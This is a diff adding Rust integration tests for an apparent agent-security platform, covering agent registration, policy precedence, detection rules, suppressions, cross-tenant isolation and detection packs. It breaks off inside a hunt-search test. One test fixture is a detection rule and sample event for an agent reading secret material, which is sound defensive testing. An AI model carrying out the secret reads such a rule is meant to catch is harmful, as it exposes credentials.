@@ -1,4 +1,4 @@
-#![allow(clippy::expect_used, clippy::unwrap_used)]
+#![allow(clippy::duplicate_mod, clippy::expect_used, clippy::unwrap_used)]
 
 use std::net::TcpListener;
 use std::process::Command;
@@ -12,6 +12,11 @@ use serde_json::Value;
 use sqlx::row::Row;
 use tower::ServiceExt;
 use uuid::Uuid;
+
+#[path = "models/case_evidence.rs"]
+pub(crate) mod case_evidence;
+#[path = "services/case_evidence.rs"]
+pub(crate) mod case_evidence_service;
 
 use crate::auth::api_key::hash_api_key;
 use crate::config::Config;
@@ -44,6 +49,25 @@ struct Harness {
     api_key: String,
     _postgres: DockerContainer,
     _nats: DockerContainer,
+}
+
+struct ConsoleFixture {
+    principal_id: Uuid,
+    grant_id: Uuid,
+    action_id: Uuid,
+}
+
+struct OperatorFlowFixture {
+    agent_id: String,
+    session_id: String,
+    detection_raw_ref: String,
+    response_raw_ref: String,
+    principal_id: Uuid,
+    response_subject: String,
+    grant_id: Uuid,
+    finding_id: Uuid,
+    case_id: String,
+    action_id: Uuid,
 }
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
@@ -213,6 +237,321 @@ async fn agents_heartbeat_recovers_stale_agent_and_reconciles_policy_kv() {
 }
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn register_agent_creates_and_links_endpoint_principal() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let keypair = hush_core::Keypair::generate();
+    let register_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/agents".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "agent_id": "agent-directory-int-1",
+            "name": "Directory Agent",
+            "public_key": keypair.public_key().to_hex(),
+            "role": "coder",
+            "trust_level": "high",
+            "metadata": {
+                "source": "integration-register"
+            }
+        })),
+    )
+    .await;
+    assert_eq!(register_resp.0, StatusCode::OK);
+
+    let row = sqlx::query::query(
+        r#"SELECT a.principal_id,
+                  p.principal_type,
+                  p.stable_ref,
+                  p.display_name,
+                  p.trust_level
+           FROM agents AS a
+           JOIN principals AS p
+             ON p.id = a.principal_id
+           WHERE a.tenant_id = $1
+             AND a.agent_id = 'agent-directory-int-1'"#,
+    )
+    .bind(harness.tenant_id)
+    .fetch_one(&harness.db)
+    .await
+    .expect("fetch linked principal");
+
+    let principal_id: Uuid = row.try_get("principal_id").expect("principal_id");
+    let principal_type: String = row.try_get("principal_type").expect("principal_type");
+    let stable_ref: String = row.try_get("stable_ref").expect("stable_ref");
+    let display_name: String = row.try_get("display_name").expect("display_name");
+    let trust_level: String = row.try_get("trust_level").expect("trust_level");
+
+    assert_ne!(principal_id, Uuid::nil());
+    assert_eq!(principal_type, "endpoint_agent");
+    assert_eq!(stable_ref, "agent-directory-int-1");
+    assert_eq!(display_name, "Directory Agent");
+    assert_eq!(trust_level, "high");
+
+    let list_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/agents".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(list_resp.0, StatusCode::OK);
+    assert_eq!(list_resp.1[0]["principal_id"], principal_id.to_string());
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn agent_effective_policy_resolves_directory_attachments_in_precedence_order() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let keypair = hush_core::Keypair::generate();
+    let register_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/agents".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "agent_id": "agent-policy-int-1",
+            "name": "Policy Agent",
+            "public_key": keypair.public_key().to_hex()
+        })),
+    )
+    .await;
+    assert_eq!(register_resp.0, StatusCode::OK);
+    let agent_uuid = Uuid::parse_str(
+        register_resp.1["id"]
+            .as_str()
+            .expect("agent id missing from register response"),
+    )
+    .expect("parse agent uuid");
+
+    let agent_row =
+        sqlx::query::query("SELECT principal_id FROM agents WHERE tenant_id = $1 AND id = $2")
+            .bind(harness.tenant_id)
+            .bind(agent_uuid)
+            .fetch_one(&harness.db)
+            .await
+            .expect("fetch agent principal");
+    let principal_id: Uuid = agent_row
+        .try_get::<Option<Uuid>, _>("principal_id")
+        .expect("principal_id")
+        .expect("principal should be linked");
+
+    let swarm_id = Uuid::new_v4();
+    let project_id = Uuid::new_v4();
+    let capability_group_id = Uuid::new_v4();
+    sqlx::query::query(
+        r#"INSERT INTO swarms (id, tenant_id, slug, name, kind)
+           VALUES ($1, $2, 'fleet-east', 'Fleet East', 'fleet')"#,
+    )
+    .bind(swarm_id)
+    .bind(harness.tenant_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed swarm");
+    sqlx::query::query(
+        r#"INSERT INTO projects (id, tenant_id, swarm_id, slug, name, environment)
+           VALUES ($1, $2, $3, 'payments-prod', 'Payments', 'prod')"#,
+    )
+    .bind(project_id)
+    .bind(harness.tenant_id)
+    .bind(swarm_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed project");
+    sqlx::query::query(
+        r#"INSERT INTO capability_groups (id, tenant_id, name, capabilities)
+           VALUES ($1, $2, 'Responders', '[]'::jsonb)"#,
+    )
+    .bind(capability_group_id)
+    .bind(harness.tenant_id)
+    .execute(&harness.db)
+    .await
+    .expect("seed capability group");
+
+    for (target_kind, target_id) in [
+        ("swarm", swarm_id),
+        ("project", project_id),
+        ("capability_group", capability_group_id),
+    ] {
+        sqlx::query::query(
+            r#"INSERT INTO principal_memberships (
+                   tenant_id,
+                   principal_id,
+                   target_kind,
+                   target_id
+               )
+               VALUES ($1, $2, $3, $4)"#,
+        )
+        .bind(harness.tenant_id)
+        .bind(principal_id)
+        .bind(target_kind)
+        .bind(target_id)
+        .execute(&harness.db)
+        .await
+        .expect("seed membership");
+    }
+
+    policy_distribution::upsert_active_policy(
+        &harness.db,
+        harness.tenant_id,
+        "policy:\n  mode: tenant-base\n  regions:\n    - global\n  keep: true\n",
+        Some("integration-effective-policy"),
+    )
+    .await
+    .expect("seed tenant active policy");
+
+    for (target_kind, target_id, priority, policy_yaml) in [
+        (
+            "tenant",
+            None,
+            10_i32,
+            "policy:\n  mode: tenant-attachment\n",
+        ),
+        ("swarm", Some(swarm_id), 20_i32, "policy:\n  mode: swarm\n"),
+        (
+            "project",
+            Some(project_id),
+            30_i32,
+            "policy:\n  regions:\n    - prod\n",
+        ),
+        (
+            "capability_group",
+            Some(capability_group_id),
+            40_i32,
+            "policy:\n  capability: responder\n",
+        ),
+        (
+            "principal",
+            Some(principal_id),
+            50_i32,
+            "policy:\n  keep: null\n  final: true\n",
+        ),
+    ] {
+        sqlx::query::query(
+            r#"INSERT INTO policy_attachments (
+                   tenant_id,
+                   target_kind,
+                   target_id,
+                   priority,
+                   policy_yaml,
+                   checksum_sha256
+               )
+               VALUES ($1, $2, $3, $4, $5, md5($5))"#,
+        )
+        .bind(harness.tenant_id)
+        .bind(target_kind)
+        .bind(target_id)
+        .bind(priority)
+        .bind(policy_yaml)
+        .execute(&harness.db)
+        .await
+        .expect("seed policy attachment");
+    }
+
+    let effective_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/agents/{agent_uuid}/effective-policy"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(effective_resp.0, StatusCode::OK);
+    assert_eq!(effective_resp.1["principal_id"], principal_id.to_string());
+    assert_eq!(
+        effective_resp.1["source_attachments"]
+            .as_array()
+            .expect("source attachments array")
+            .len(),
+        5
+    );
+
+    let compiled_yaml = effective_resp.1["compiled_policy_yaml"]
+        .as_str()
+        .expect("compiled policy yaml");
+    let compiled: Value = serde_yaml::from_str(compiled_yaml).expect("compiled yaml parses");
+    assert_eq!(compiled["policy"]["mode"], "swarm");
+    assert_eq!(compiled["policy"]["regions"][0], "prod");
+    assert_eq!(compiled["policy"]["capability"], "responder");
+    assert_eq!(compiled["policy"]["final"], true);
+    assert!(compiled["policy"].get("keep").is_none());
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn agent_effective_policy_fails_closed_for_unresolved_matching_policy_ref() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let keypair = hush_core::Keypair::generate();
+    let register_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/agents".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "agent_id": "agent-policy-ref-int-1",
+            "name": "Policy Ref Agent",
+            "public_key": keypair.public_key().to_hex()
+        })),
+    )
+    .await;
+    assert_eq!(register_resp.0, StatusCode::OK);
+    let agent_uuid = Uuid::parse_str(
+        register_resp.1["id"]
+            .as_str()
+            .expect("agent id missing from register response"),
+    )
+    .expect("parse agent uuid");
+
+    sqlx::query::query(
+        r#"INSERT INTO policy_attachments (
+               tenant_id,
+               target_kind,
+               priority,
+               policy_ref,
+               checksum_sha256
+           )
+           VALUES ($1, 'tenant', 10, $2, md5($2))"#,
+    )
+    .bind(harness.tenant_id)
+    .bind("catalog/default")
+    .execute(&harness.db)
+    .await
+    .expect("seed policy ref attachment");
+
+    let effective_resp = request_json(
+        &harness.app,
+        Method::GET,
+        format!("/api/v1/agents/{agent_uuid}/effective-policy"),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+
+    assert_eq!(effective_resp.0, StatusCode::CONFLICT);
+    let error = effective_resp.1["error"]
+        .as_str()
+        .expect("error message missing");
+    assert!(
+        error.contains("unresolved policy_ref`catalog/default`")
+            || error.contains("unresolved policy_ref `catalog/default`")
+    );
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn approvals_list_and_resolve_publish_signed_payload_and_mark_outbox_sent() {
     if !docker_available() {
         eprintln!("Skipping integration test: docker is unavailable");
@@ -320,7 +659,608 @@ async fn approvals_list_and_resolve_publish_signed_payload_and_mark_outbox_sent(
     assert_eq!(status, "sent");
     assert!(attempts >= 1);
 }
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn detections_rule_crud_and_test_flow_work() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
 
+    let harness = setup_harness().await;
+    let create_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/detections/rules".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "name": "Suspicious secret read",
+            "description": "Detect test secret reads",
+            "severity": "high",
+            "source_format": "native_correlation",
+            "execution_mode": "streaming",
+            "source_text": "schema: clawdstrike.hunt.correlation.v1\nname: suspicious-secret-read\nseverity: high\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    target_pattern: secret\n    bind: secret_read\noutput:\n  title: Secret read detected\n  evidence:\n    - secret_read\n",
+            "tags": ["test", "detection"],
+            "enabled": true
+        })),
+    )
+    .await;
+    assert_eq!(create_resp.0, StatusCode::OK);
+    let rule_id = create_resp.1["id"].as_str().expect("rule id");
+    assert_eq!(create_resp.1["engine_kind"], "correlation");
+
+    let update_resp = request_json(
+        &harness.app,
+        Method::PATCH,
+        format!("/api/v1/detections/rules/{rule_id}"),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "description": "Detect test secret reads v2",
+            "enabled": false
+        })),
+    )
+    .await;
+    assert_eq!(update_resp.0, StatusCode::OK);
+    assert_eq!(update_resp.1["description"], "Detect test secret reads v2");
+    assert_eq!(update_resp.1["enabled"], false);
+    assert_eq!(update_resp.1["created_by"], create_resp.1["created_by"]);
+
+    let list_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/detections/rules".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(list_resp.0, StatusCode::OK);
+    assert_eq!(list_resp.1.as_array().expect("rules array").len(), 1);
+
+    let test_resp = request_json(
+        &harness.app,
+        Method::POST,
+        format!("/api/v1/detections/rules/{rule_id}/test"),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "sample_events": [{
+                "timestamp": "2026-03-06T00:00:00Z",
+                "source": "receipt",
+                "summary": "agent read secret material",
+                "verdict": "allow",
+                "severity": "high",
+                "action_type": "file"
+            }]
+        })),
+    )
+    .await;
+    assert_eq!(test_resp.0, StatusCode::OK);
+    assert_eq!(test_resp.1["valid"], true);
+    assert_eq!(
+        test_resp.1["findings"]
+            .as_array()
+            .expect("findings array")
+            .len(),
+        1
+    );
+    assert_eq!(test_resp.1["findings"][0]["title"], "Secret read detected");
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn detections_suppression_marks_findings_without_deleting_evidence() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let detection_service = AlerterService::new(harness.db.clone());
+    let rule = detection_service
+        .create_detection_rule(
+            harness.tenant_id,
+            "integration-test",
+            crate::services::alerter::CreateDetectionRule {
+                name: "suppression-test".to_string(),
+                description: Some("suppression coverage".to_string()),
+                severity: "medium".to_string(),
+                source_format: "native_correlation".to_string(),
+                execution_mode: "streaming".to_string(),
+                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: suppression-test\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Suppression test\n  evidence:\n    - evt\n".to_string()),
+                source_object: None,
+                tags: Some(vec!["test".to_string()]),
+                mitre_attack: None,
+                enabled: Some(true),
+                author: Some("integration-test".to_string()),
+            },
+        )
+        .await
+        .expect("create rule");
+    let finding = detection_service
+        .create_detection_finding_for_test(
+            harness.tenant_id,
+            rule.id,
+            &rule.name,
+            &rule.source_format,
+            "medium",
+            "Suppression test",
+            "matched suppression flow",
+            &["artifact://evt-1", "artifact://evt-2"],
+        )
+        .await
+        .expect("create finding");
+
+    let suppress_resp = request_json(
+        &harness.app,
+        Method::POST,
+        format!("/api/v1/detections/findings/{}/suppress", finding.id),
+        Some(&harness.api_key),
+        Some(serde_json::json!({ "reason": "known benign fixture" })),
+    )
+    .await;
+    assert_eq!(suppress_resp.0, StatusCode::OK);
+    assert_eq!(suppress_resp.1["status"], "suppressed");
+    assert!(
+        suppress_resp.1["evidence_refs"]
+            .as_array()
+            .expect("evidence array")
+            .len()
+            >= 2
+    );
+    assert!(suppress_resp.1["ocsf"]["finding_info"].is_object());
+
+    let suppression_list = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/detections/suppressions".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(suppression_list.0, StatusCode::OK);
+    assert_eq!(
+        suppression_list
+            .1
+            .as_array()
+            .expect("suppressions array")
+            .len(),
+        1
+    );
+    assert_eq!(suppression_list.1[0]["reason"], "known benign fixture");
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn detections_cross_tenant_suppression_reference_does_not_persist() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let detection_service = AlerterService::new(harness.db.clone());
+    let local_rule = detection_service
+        .create_detection_rule(
+            harness.tenant_id,
+            "integration-test",
+            crate::services::alerter::CreateDetectionRule {
+                name: "local-suppression-target".to_string(),
+                description: Some("local rule".to_string()),
+                severity: "medium".to_string(),
+                source_format: "native_correlation".to_string(),
+                execution_mode: "streaming".to_string(),
+                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: local-suppression-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Local suppression target\n  evidence:\n    - evt\n".to_string()),
+                source_object: None,
+                tags: Some(vec!["test".to_string()]),
+                mitre_attack: None,
+                enabled: Some(true),
+                author: Some("integration-test".to_string()),
+            },
+        )
+        .await
+        .expect("create local rule");
+
+    let foreign_tenant_id = seed_tenant(&harness.db, "other-int", "Other Integration").await;
+    let foreign_rule = detection_service
+        .create_detection_rule(
+            foreign_tenant_id,
+            "integration-test",
+            crate::services::alerter::CreateDetectionRule {
+                name: "foreign-suppression-target".to_string(),
+                description: Some("foreign rule".to_string()),
+                severity: "medium".to_string(),
+                source_format: "native_correlation".to_string(),
+                execution_mode: "streaming".to_string(),
+                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: foreign-suppression-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Foreign suppression target\n  evidence:\n    - evt\n".to_string()),
+                source_object: None,
+                tags: Some(vec!["test".to_string()]),
+                mitre_attack: None,
+                enabled: Some(true),
+                author: Some("integration-test".to_string()),
+            },
+        )
+        .await
+        .expect("create foreign rule");
+    let foreign_finding = detection_service
+        .create_detection_finding_for_test(
+            foreign_tenant_id,
+            foreign_rule.id,
+            &foreign_rule.name,
+            &foreign_rule.source_format,
+            "medium",
+            "Foreign suppression target",
+            "foreign finding",
+            &["artifact://foreign-evt-1"],
+        )
+        .await
+        .expect("create foreign finding");
+
+    let suppress_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/detections/suppressions".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "rule_id": local_rule.id,
+            "finding_id": foreign_finding.id,
+            "reason": "cross-tenant reference"
+        })),
+    )
+    .await;
+    assert_eq!(suppress_resp.0, StatusCode::NOT_FOUND);
+
+    let suppression_count: i64 = sqlx::query_scalar::query_scalar(
+        "SELECT COUNT(*) FROM detection_suppressions WHERE tenant_id = $1",
+    )
+    .bind(harness.tenant_id)
+    .fetch_one(&harness.db)
+    .await
+    .expect("count suppressions");
+    assert_eq!(suppression_count, 0);
+
+    let foreign_finding_after = detection_service
+        .get_detection_finding(foreign_tenant_id, foreign_finding.id)
+        .await
+        .expect("load foreign finding");
+    assert_eq!(foreign_finding_after.status, "open");
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn detections_findings_require_tenant_local_rule_reference() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let detection_service = AlerterService::new(harness.db.clone());
+    let foreign_tenant_id = seed_tenant(
+        &harness.db,
+        "finding-other-int",
+        "Finding Other Integration",
+    )
+    .await;
+    let foreign_rule = detection_service
+        .create_detection_rule(
+            foreign_tenant_id,
+            "integration-test",
+            crate::services::alerter::CreateDetectionRule {
+                name: "foreign-finding-target".to_string(),
+                description: Some("foreign rule".to_string()),
+                severity: "medium".to_string(),
+                source_format: "native_correlation".to_string(),
+                execution_mode: "streaming".to_string(),
+                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: foreign-finding-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Foreign finding target\n  evidence:\n    - evt\n".to_string()),
+                source_object: None,
+                tags: Some(vec!["test".to_string()]),
+                mitre_attack: None,
+                enabled: Some(true),
+                author: Some("integration-test".to_string()),
+            },
+        )
+        .await
+        .expect("create foreign rule");
+
+    let err = detection_service
+        .create_detection_finding_for_test(
+            harness.tenant_id,
+            foreign_rule.id,
+            &foreign_rule.name,
+            &foreign_rule.source_format,
+            "medium",
+            "Cross tenant finding target",
+            "should fail",
+            &["artifact://foreign-evt-1"],
+        )
+        .await
+        .expect_err("cross-tenant rule reference should fail");
+    assert!(matches!(err, crate::error::ApiError::NotFound));
+
+    let finding_count: i64 = sqlx::query_scalar::query_scalar(
+        "SELECT COUNT(*) FROM detection_findings WHERE tenant_id = $1",
+    )
+    .bind(harness.tenant_id)
+    .fetch_one(&harness.db)
+    .await
+    .expect("count findings");
+    assert_eq!(finding_count, 0);
+
+    let evidence_count: i64 = sqlx::query_scalar::query_scalar(
+        "SELECT COUNT(*) FROM detection_finding_evidence WHERE tenant_id = $1",
+    )
+    .bind(harness.tenant_id)
+    .fetch_one(&harness.db)
+    .await
+    .expect("count evidence");
+    assert_eq!(evidence_count, 0);
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn detections_mismatched_rule_and_finding_reference_do_not_persist() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let detection_service = AlerterService::new(harness.db.clone());
+    let primary_rule = detection_service
+        .create_detection_rule(
+            harness.tenant_id,
+            "integration-test",
+            crate::services::alerter::CreateDetectionRule {
+                name: "primary-suppression-target".to_string(),
+                description: Some("primary rule".to_string()),
+                severity: "medium".to_string(),
+                source_format: "native_correlation".to_string(),
+                execution_mode: "streaming".to_string(),
+                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: primary-suppression-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Primary suppression target\n  evidence:\n    - evt\n".to_string()),
+                source_object: None,
+                tags: Some(vec!["test".to_string()]),
+                mitre_attack: None,
+                enabled: Some(true),
+                author: Some("integration-test".to_string()),
+            },
+        )
+        .await
+        .expect("create primary rule");
+    let secondary_rule = detection_service
+        .create_detection_rule(
+            harness.tenant_id,
+            "integration-test",
+            crate::services::alerter::CreateDetectionRule {
+                name: "secondary-suppression-target".to_string(),
+                description: Some("secondary rule".to_string()),
+                severity: "medium".to_string(),
+                source_format: "native_correlation".to_string(),
+                execution_mode: "streaming".to_string(),
+                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: secondary-suppression-target\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Secondary suppression target\n  evidence:\n    - evt\n".to_string()),
+                source_object: None,
+                tags: Some(vec!["test".to_string()]),
+                mitre_attack: None,
+                enabled: Some(true),
+                author: Some("integration-test".to_string()),
+            },
+        )
+        .await
+        .expect("create secondary rule");
+    let finding = detection_service
+        .create_detection_finding_for_test(
+            harness.tenant_id,
+            primary_rule.id,
+            &primary_rule.name,
+            &primary_rule.source_format,
+            "medium",
+            "Primary suppression target",
+            "local finding",
+            &["artifact://local-evt-1"],
+        )
+        .await
+        .expect("create local finding");
+
+    let suppress_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/detections/suppressions".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "rule_id": secondary_rule.id,
+            "finding_id": finding.id,
+            "reason": "mismatched references"
+        })),
+    )
+    .await;
+    assert_eq!(suppress_resp.0, StatusCode::BAD_REQUEST);
+    assert_eq!(
+        suppress_resp.1["error"],
+        "finding_id does not belong to the provided rule_id"
+    );
+
+    let suppression_count: i64 = sqlx::query_scalar::query_scalar(
+        "SELECT COUNT(*) FROM detection_suppressions WHERE tenant_id = $1",
+    )
+    .bind(harness.tenant_id)
+    .fetch_one(&harness.db)
+    .await
+    .expect("count suppressions");
+    assert_eq!(suppression_count, 0);
+
+    let finding_after = detection_service
+        .get_detection_finding(harness.tenant_id, finding.id)
+        .await
+        .expect("load finding");
+    assert_eq!(finding_after.status, "open");
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn detection_packs_remain_policy_pack_metadata_extensions() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let create_rule = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/detections/rules".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "name": "Pack rule",
+            "description": "Pack activation coverage",
+            "severity": "high",
+            "source_format": "sigma",
+            "execution_mode": "streaming",
+            "source_text": "title: Pack Rule\nlevel: high\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    CommandLine: suspicious\n  condition: selection\n",
+            "enabled": true
+        })),
+    )
+    .await;
+    assert_eq!(create_rule.0, StatusCode::OK);
+    let rule_id = create_rule.1["id"].as_str().expect("rule id").to_string();
+
+    let install_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/detections/packs/install".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "package_name": "fleet-pack",
+            "version": "1.0.0",
+            "trust_level": "verified",
+            "metadata": {
+                "pkg_type": "policy-pack",
+                "clawdstrike": {
+                    "detection_pack": {
+                        "format_version": "1",
+                        "contains": ["sigma", "native_correlation"],
+                        "default_enable": false
+                    }
+                }
+            }
+        })),
+    )
+    .await;
+    assert_eq!(install_resp.0, StatusCode::OK);
+    assert_eq!(install_resp.1["package_type"], "policy-pack");
+
+    let activate_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/detections/packs/fleet-pack/1.0.0/activate".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "activated_rules": [rule_id]
+        })),
+    )
+    .await;
+    assert_eq!(activate_resp.0, StatusCode::OK);
+    assert_eq!(
+        activate_resp.1["activated_rules"]
+            .as_array()
+            .expect("activated rules")
+            .len(),
+        1
+    );
+
+    let pack_rules = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/detections/packs/fleet-pack/1.0.0/rules".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(pack_rules.0, StatusCode::OK);
+    assert_eq!(pack_rules.1.as_array().expect("pack rules").len(), 1);
+    assert_eq!(pack_rules.1[0]["name"], "Pack rule");
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn detection_pack_activation_rejects_cross_tenant_rule_ids() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    let detection_service = AlerterService::new(harness.db.clone());
+    let foreign_tenant_id =
+        seed_tenant(&harness.db, "pack-other-int", "Pack Other Integration").await;
+    let foreign_rule = detection_service
+        .create_detection_rule(
+            foreign_tenant_id,
+            "integration-test",
+            crate::services::alerter::CreateDetectionRule {
+                name: "foreign-pack-rule".to_string(),
+                description: Some("foreign pack rule".to_string()),
+                severity: "medium".to_string(),
+                source_format: "native_correlation".to_string(),
+                execution_mode: "streaming".to_string(),
+                source_text: Some("schema: clawdstrike.hunt.correlation.v1\nname: foreign-pack-rule\nseverity: medium\ndescription: test\nwindow: 30s\nconditions:\n  - source: receipt\n    bind: evt\noutput:\n  title: Foreign pack rule\n  evidence:\n    - evt\n".to_string()),
+                source_object: None,
+                tags: Some(vec!["test".to_string()]),
+                mitre_attack: None,
+                enabled: Some(true),
+                author: Some("integration-test".to_string()),
+            },
+        )
+        .await
+        .expect("create foreign rule");
+
+    let install_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/detections/packs/install".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "package_name": "fleet-pack-invalid",
+            "version": "1.0.0",
+            "trust_level": "verified",
+            "metadata": {
+                "pkg_type": "policy-pack",
+                "clawdstrike": {
+                    "detection_pack": {
+                        "format_version": "1",
+                        "contains": ["native_correlation"],
+                        "default_enable": false
+                    }
+                }
+            }
+        })),
+    )
+    .await;
+    assert_eq!(install_resp.0, StatusCode::OK);
+
+    let activate_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/detections/packs/fleet-pack-invalid/1.0.0/activate".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "activated_rules": [foreign_rule.id]
+        })),
+    )
+    .await;
+    assert_eq!(activate_resp.0, StatusCode::BAD_REQUEST);
+    assert!(activate_resp.1["error"]
+        .as_str()
+        .expect("activation error")
+        .contains("activated_rules contains unknown or cross-tenant rule id"));
+
+    let pack_resp = request_json(
+        &harness.app,
+        Method::GET,
+        "/api/v1/detections/packs/fleet-pack-invalid/1.0.0".to_string(),
+        Some(&harness.api_key),
+        None,
+    )
+    .await;
+    assert_eq!(pack_resp.0, StatusCode::OK);
+    assert_eq!(
+        pack_resp.1["activated_rules"]
+            .as_array()
+            .expect("activated rules")
+            .len(),
+        0
+    );
+}
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn create_tenant_rolls_back_when_nats_provisioning_fails() {
     if !docker_available() {
@@ -405,6 +1345,1072 @@ async fn create_tenant_rolls_back_when_nats_provisioning_fails() {
         row.is_none(),
         "tenant row must be rolled back on provisioning failure"
     );
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn hunt_search_timeline_and_saved_hunts_round_trip() {
+    if !docker_available() {
+        eprintln!("Skipping integration test: docker is unavailable");
+        return;
+    }
+
+    let harness = setup_harness().await;
+    seed_hunt_events(&harness).await;
+
+    let search_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/search".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "principalId": "principal-1",
+            "limit": 1
+        })),
+    )
+    .await;
+    assert_eq!(search_resp.0, StatusCode::OK);
+    assert_eq!(search_resp.1["total"], 2);
+    assert_eq!(search_resp.1["events"][0]["eventId"], "hunt-evt-2");
+    assert!(search_resp.1["nextCursor"].is_string());
+
+    let cursor = search_resp.1["nextCursor"]
+        .as_str()
+        .expect("next cursor should be present")
+        .to_string();
+    let next_page_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/search".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "principalId": "principal-1",
+            "limit": 1,
+            "cursor": cursor
+        })),
+    )
+    .await;
+    assert_eq!(next_page_resp.0, StatusCode::OK);
+    assert_eq!(next_page_resp.1["events"][0]["eventId"], "hunt-evt-1");
+
+    let timeline_resp = request_json(
+        &harness.app,
+        Method::POST,
+        "/api/v1/hunt/timeline".to_string(),
+        Some(&harness.api_key),
+        Some(serde_json::json!({
+            "sessionId": "session-1",
+            "limit": 10
+        })),
+    )
